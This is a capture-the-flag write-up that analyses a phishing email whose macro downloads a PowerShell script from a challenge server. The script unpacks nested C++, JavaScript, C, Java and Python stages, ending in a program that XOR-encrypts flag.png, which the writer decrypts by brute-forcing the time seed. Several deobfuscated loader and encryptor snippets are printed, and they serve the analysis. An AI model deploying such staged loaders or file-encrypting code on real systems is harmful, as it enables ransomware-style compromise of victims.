# Phishing in the open sea

> As an avid and outspoken tugboat enthusiast, I was delighted to receive a special message in my mailbox while eating breakfast! I had been chosen to receive a free tugboat, and it was already on its way to my address! I followed the provided instructions to track the shipping.
>
> It was already too late when I realized that I had been a victim to a phishing attack! I checked my file system for damage, and to my horror, my precious "flag.png" file had been encrypted! In my fury I deleted some random files it looks like the malware created, so all I've got is the original email. All I remember is that I opened the message within minutes of receiving it... Can you help me get my dear flag back?

Provided: [`Phishing.zip`](Phishing.zip)

## Solution

As always if we get a zip archive it's always good to extract it :)

```shell
$ unzip Phishing.zip
Archive:  Phishing.zip
   creating: Phishing in the open sea/
  inflating: Phishing in the open sea/flag.png
  inflating: Phishing in the open sea/important.eml
```

Looks like a PNG and an email? Let's run `file` on them to make sure:

```shell
$ cd "Phishing in the open sea"
$ file flag.png important.eml
flag.png:      data
important.eml: news or mail, ASCII text
```

Huh that's weird, `file` doesn't think the PNG is an actual image.
If we check a hexdump of its first few bytes we can confirm that they don't match the PNG magic bytes (`89 50 4e 47 0d 0a 1a 0a` according to [Wikipedia](https://en.wikipedia.org/wiki/PNG)):

```shell
$ hexyl -n 8 flag.png
┌────────┬─────────────────────────┬────────┐
│00000000│ 73 7a 99 15 5e f6 0f 55 │sz×•^×•U│
└────────┴─────────────────────────┴────────┘
```

I guess the challenge description did mention their `flag.png` file getting encrypted, so we'll probably figure out how to decrypt it later on in the challenge.
For now though, all we really can do is take a look at the email file.

It looks like it has one attachment, `tugboat.xlsl`, which seems to be an Excel spreadsheet.
We can turn the Base64-encoded attachment back into the attachment using the `base64` command on [a file containing just the Base64](recovered/tugboat-base64.txt):

```shell
$ base64 -d tugboat-base64.txt > tugboat.xlsl
$ file tugboat.xlsl
tugboat.xlsl: Microsoft Excel 2007+
```

So there's our spreadsheet!
Since I...don't have Excel installed I decided to try to unzip it instead of opening it up, since all Office files are basically just fancy zip archives :)

```shell
$ unzip tugboat.xlsl
Archive:  tugboat.xlsl
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/worksheets/sheet2.xml
  inflating: xl/theme/theme1.xml
  inflating: xl/styles.xml
  inflating: xl/drawings/drawing1.xml
  inflating: xl/drawings/vmlDrawing1.vml
  inflating: xl/vbaProject.bin
  inflating: xl/worksheets/_rels/sheet1.xml.rels
  inflating: xl/printerSettings/printerSettings1.bin
  inflating: xl/ctrlProps/ctrlProp1.xml
  inflating: docProps/core.xml
  inflating: docProps/app.xml
```

That's a lot of stuff, but that [`vbaProject.bin`](recovered/vbaProject.bin) file looks especially interesting.
It seems to be a binary file, so I decided to run it through `strings` and ended up finding an interesting URL: http://5e05f2c5b7a27431908a.ctf-league.osusec.org/1676867592.
Visiting it prompts us to download [a file](recovered/1676867592), which appears to be a PowerShell script.

This is what it looks like without the long Base64 string at the beginning:

```powershell
$data = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($d))
ni out4
echo $data > out4
g++ out4
./a.out
```

So it looks like the PowerShell script...compiles and runs a C++ program?
I guess we can decode the Base64 string using `base64 -d` again to get [the program itself](recovered/powershell-out.cpp):

```shell
$ base64 -d 1676867592-base64.txt > powershell-out.cpp
```

Based on the end of it it looks like it runs some JavaScript program that it somehow decodes from one of the hex strings at the beginning of the file??

```cpp
    # snip
    string end_game(1 ? data : buffer);
    system(("node -e " + string("'") + end_game + string("'")).c_str());
}
```

I guess 1 will always evaluate to true, so that ternary expression will just evaluate to whatever is stored in `data`.
We can figure out exactly what that is based on earlier on in the program:

```cpp
    string str(DATA);

    char* data = new char[str.size() + 1]; 
    strcpy(data, str.c_str());
    memfrob(data, strlen(data));
```

In this case, `DATA` is a macro defined before this, but it's like 800000 characters long so I didn't include it there for obvious reasons.
According to its man page, [`memfrob(3)`](https://www.man7.org/linux/man-pages/man3/memfrob.3.html) just xors every byte in the provided range with the number 42, which is clearly very secure :)
We can shove the hex string into CyberChef to get [the JavaScript](recovered/cpp-output.js) that's run on the command line, and lo and behold it has another Base64 string :>

The JavaScript is also obfuscated, so I put it through an [online deobfuscator](https://deobfuscate.io/) which makes it much easier to read:

```javascript
const exec = require("child_process").exec;
if (Date.now() > 1676086400) {
  process.exit(0);
}

const raw_data = "<omitted due to length>";
const buffer = Buffer.from(raw_data, "base64");
const decoded_string = buffer.toString("utf8");

let data = "";
for (const char of decoded_string) {
  data += String.fromCharCode(char.charCodeAt(0) + 7);
}

exec(`${"echo '"}${data}${"' | gcc -x c -"}`);
```

So this program decodes a Base64 string (with some additional character manipulation) into a C program.
This just keeps on going doesn't it :>

Anyways, [some CyberChef action](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)ADD(%7B'option':'Hex','string':'7'%7D)) later we're then left with [the C program in question](recovered/js-output.c) which...creates a Java class file and runs it?
It really does just keep going :)

We can paste the hex string into CyberChef again and save it that way, leaving us with [M62.class](recovered/M62.class).
You could stick it into a Java decompiler, but I just decided to run `strings` on it and, lo and behold, it contains another Base64 string :)

We can then decode *that* to get [another C++ program](recovered/java-out.cpp) which now has some funky macros to make it hard to read :>

Luckly for us, though, `gcc` has the `-E` option which does the preprocessing steps of compiling, including expanding macros and including header files.
The latter does mean that the result of doing this is over 50000 lines long, but we really only care about the end where our functions are.
After some manual renaming and cleanup, you end up with this which is definitely much easier to read:

```cpp
string _ = "60646766696b176958655b666423176b60645c0101605d1f6b60645c256b60645c1f20173517282d2e2d272f2d2b2727203101171717175c6f606b1f282001015917341766675c651f195d63585e2567655e192317196959192025695c585b1f20016958655b6664256a5c5c5b1f69666c655b1f6b60645c256b60645c1f2020200101391734175254015d66691756176065176958655e5c1f635c651f59202031011717171739255867675c655b1f6958655b6664256958655b60656b1f2723292c2c202001015d17341759706b5c58696958701f5920015d66691760176065176958655e5c1f635c651f5920203101171717175d526054173417595260541755173952605401011a17466d5c6969605b5c175d63585e2517646c586e585f585f585f585f016e17341766675c651f195d63585e2567655e192317196e591920016e256e69606b5c1f5d20";
 
void just_exit(){
    exit(1);
}

vector<char> i_wonder_what_i_do(string encoded)
{
    vector<char> result;

    for(long long index = 0; index < encoded.size(); index+=2)){
        string str = encoded.substr(index,2);
        auto t = time(0);
        char b = (char) strtol(str.c_str(), __null, 16);
        result.push_back(b + 9);
        if(t > 1676086400) goto end;
    }
end: just_exit();
    return result;
}

int main(int argc, char* argv[], char** envp)
{
    vector<char> decoded_hex = i_wonder_what_i_do(_);
    auto t = time(0);
    char* decoded_ptr = &decoded_hex[0];
    string str = string(decoded_ptr);
    if(t > 1676086400) exit(1);
    char* exec_argv[] = { const_cast<char*>(string("python3").c_str()), "-c",const_cast<char *>(str.c_str()), __null };
    if(time(0) > 1676086400) exit(0);
    if(time(0) > t > 1676086400) exit(1);
    execve(const_cast<char*>(string("/bin/python3").c_str()), exec_argv, __null);
}
```

So this C++ program decodes the hex string and adds 9 to each character's codepoint to make it into a *Python* program which it then runs.
Again, [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')ADD(%7B'option':'Hex','string':'9'%7D)&input=NjA2NDY3NjY2OTZiMTc2OTU4NjU1YjY2NjQyMzE3NmI2MDY0NWMwMTAxNjA1ZDFmNmI2MDY0NWMyNTZiNjA2NDVjMWYyMDE3MzUxNzI4MmQyZTJkMjcyZjJkMmIyNzI3MjAzMTAxMTcxNzE3MTc1YzZmNjA2YjFmMjgyMDAxMDE1OTE3MzQxNzY2Njc1YzY1MWYxOTVkNjM1ODVlMjU2NzY1NWUxOTIzMTcxOTY5NTkxOTIwMjU2OTVjNTg1YjFmMjAwMTY5NTg2NTViNjY2NDI1NmE1YzVjNWIxZjY5NjY2YzY1NWIxZjZiNjA2NDVjMjU2YjYwNjQ1YzFmMjAyMDIwMDEwMTM5MTczNDE3NTI1NDAxNWQ2NjY5MTc1NjE3NjA2NTE3Njk1ODY1NWU1YzFmNjM1YzY1MWY1OTIwMjAzMTAxMTcxNzE3MTczOTI1NTg2NzY3NWM2NTViMWY2OTU4NjU1YjY2NjQyNTY5NTg2NTViNjA2NTZiMWYyNzIzMjkyYzJjMjAyMDAxMDE1ZDE3MzQxNzU5NzA2YjVjNTg2OTY5NTg3MDFmNTkyMDAxNWQ2NjY5MTc2MDE3NjA2NTE3Njk1ODY1NWU1YzFmNjM1YzY1MWY1OTIwMjAzMTAxMTcxNzE3MTc1ZDUyNjA1NDE3MzQxNzU5NTI2MDU0MTc1NTE3Mzk1MjYwNTQwMTAxMWExNzQ2NmQ1YzY5Njk2MDViNWMxNzVkNjM1ODVlMjUxNzY0NmM1ODZlNTg1ZjU4NWY1ODVmNTg1ZjAxNmUxNzM0MTc2NjY3NWM2NTFmMTk1ZDYzNTg1ZTI1Njc2NTVlMTkyMzE3MTk2ZTU5MTkyMDAxNmUyNTZlNjk2MDZiNWMxZjVkMjA) is our friend here for recovering [that Python program](recovered/cpp2-output.py), which I'll include here as well since it's not too long:

```python
import random, time

if(time.time() > 1676086400):
    exit(1)

b = open("flag.png", "rb").read()
random.seed(round(time.time()))

B = []
for _ in range(len(b)):
    B.append(random.randint(0,255))

f = bytearray(b)
for i in range(len(b)):
    f[i] = b[i] ^ B[i]

# Override flag. muawahahahah
w = open("flag.png", "wb")
w.write(f)
```

Aha! Finally something that doesn't just generate another program :)
It looks like this is what ended up encrypting flag.png, which was done by randomly generating an xor mask to be applied over the entire file.
Initially I wasn't really sure what to do here, but I did notice that the random number generator was seeded with the current Unix timestamp in seconds, so if we could find out when this program was run then we could probably recover the PNG.
We also know the 8 bytes that the PNG has to start with in order to be a real PNG from earlier: `89 50 4e 47 0d 0a 1a 0a`.
If we xor those bytes with the corresponding bytes of the encrypted flag.png, we'll get the first few outputs from the random number generator.
We can then just iterate over the timestamps before 1676086400, since this program refuses to execute beyond that point.

This definitely isn't the best way to do all of that, but this is [the Python script](bruteforce-timestamp.py) I used that gave me the correct timestamp :)

```python
import random

t = 1676086400 # from time check
while t > 0:
    random.seed(t)
    res1 = random.randint(0, 255)
    res2 = random.randint(0, 255)
    res3 = random.randint(0, 255)

    # 250/42/215 were obtained by xoring the first 3 bytes of the PNG magic/flag.png
    if res1 == 250 and res2 == 42 and res3 == 215:
        break

    t -= 1
print(f"{t = }")
```

When we run that script, we get the correct time value:

```shell
$ python bruteforce-timestamp.py
t = 1676000124
```

We can then plug that in for the random number generator seed in the encryption program above to decrypt flag.png, which gives is this very nice image :)

<div align="center">
<img src="flag-decrypted.png" alt="Decrypted flag.png with flag text at the bottom">
</div>

And there's our flag at the bottom: `osu{7u6b0475_4r3_50_c00l}`!
(You might have trouble seeing it if you're using a dark theme ;))

To review what it took to get that, we had to:

- Decode a Base64-encoded email attachment into an excel spreadsheet which...
- Contained a Visual Basic macro that downloaded a...
- PowerShell script which decoded a Base64 string into a...
- C++ program which it then compiled and ran, generating a...
- JavaScript program which then also ran, outputting a...
- C program which, when compiled and run writes a...
- Java class file which is then run to output yet another...
- C++ program which decodes a hex string into a...
- Python program which encrypted the flag image, and with some brute forcing let us decrypt it as well.

I'd better get a free tugboat for helping this person recover their encrypted PNG :)